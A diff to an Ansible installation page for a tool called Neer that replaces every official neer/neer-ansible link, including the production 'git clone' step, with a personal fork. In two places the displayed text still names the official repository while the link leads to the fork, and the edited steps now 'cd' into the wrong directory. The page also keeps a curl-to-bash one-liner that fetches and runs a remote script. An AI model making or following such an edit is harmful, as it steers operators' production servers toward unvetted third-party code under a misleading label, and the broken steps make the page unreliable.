@@ -9,7 +9,7 @@ title: "Ansible"
 
 # Ansible Installation
 
-The recommended way to deploy Neer to production servers is via **[neer-ansible](https://github.com/neer/neer-ansible)** — an automated installer with security-first architecture.
+The recommended way to deploy Neer to production servers is via **[neer-ansible](https://github.com/khalilbenhaya1/neerV1-ansible)** — an automated installer with security-first architecture.
 
 ## Quick Start
 
@@ -19,7 +19,7 @@ One-command install:
 curl -fsSL https://raw.githubusercontent.com/neer/neer-ansible/main/install.sh | bash
 ```
 
-> **📦 Full guide: [github.com/neer/neer-ansible](https://github.com/neer/neer-ansible)**
+> **📦 Full guide: [github.com/neer/neer-ansible](https://github.com/khalilbenhaya1/neerV1-ansible)**
 >
 > The neer-ansible repo is the source of truth for Ansible deployment. This page is a quick overview.
 
@@ -118,7 +118,7 @@ If you prefer manual control over the automation:
 sudo apt update && sudo apt install -y ansible git
 
 # 2. Clone repository
-git clone https://github.com/neer/neer-ansible.git
+git clone https://github.com/khalilbenhaya1/neerV1-ansible.git
 cd neer-ansible
 
 # 3. Install Ansible collections
@@ -196,13 +196,13 @@ neer channels login
 
 For detailed security architecture and troubleshooting:
 
-- [Security Architecture](https://github.com/neer/neer-ansible/blob/main/docs/security.md)
-- [Technical Details](https://github.com/neer/neer-ansible/blob/main/docs/architecture.md)
-- [Troubleshooting Guide](https://github.com/neer/neer-ansible/blob/main/docs/troubleshooting.md)
+- [Security Architecture](https://github.com/khalilbenhaya1/neerV1-ansible/blob/main/docs/security.md)
+- [Technical Details](https://github.com/khalilbenhaya1/neerV1-ansible/blob/main/docs/architecture.md)
+- [Troubleshooting Guide](https://github.com/khalilbenhaya1/neerV1-ansible/blob/main/docs/troubleshooting.md)
 
 ## Related
 
-- [neer-ansible](https://github.com/neer/neer-ansible) — full deployment guide
+- [neer-ansible](https://github.com/khalilbenhaya1/neerV1-ansible) — full deployment guide
 - [Docker](/install/docker) — containerized gateway setup
 - [Sandboxing](/gateway/sandboxing) — agent sandbox configuration
 - [Multi-Agent Sandbox & Tools](/tools/multi-agent-sandbox-tools) — per-agent isolation
